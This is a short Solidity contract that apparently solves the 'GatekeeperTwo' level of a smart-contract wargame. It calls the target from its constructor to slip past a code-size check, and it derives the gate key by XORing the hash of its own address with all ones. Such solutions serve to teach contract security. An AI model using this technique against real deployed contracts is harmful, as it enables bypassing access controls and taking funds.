// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "../14-GatekeeperTwo.sol";

contract GatekeeperTwoAttacker {
    GatekeeperTwo public victim;
    bool public called;

    constructor(address _victimAddress) {
        victim = GatekeeperTwo(_victimAddress);
        bytes8 key;

        unchecked {
            key = bytes8(
                uint64(bytes8(keccak256(abi.encodePacked(this)))) ^
                    (uint64(0) - 1)
            );
        }

        victim.enter(key);
    }
}
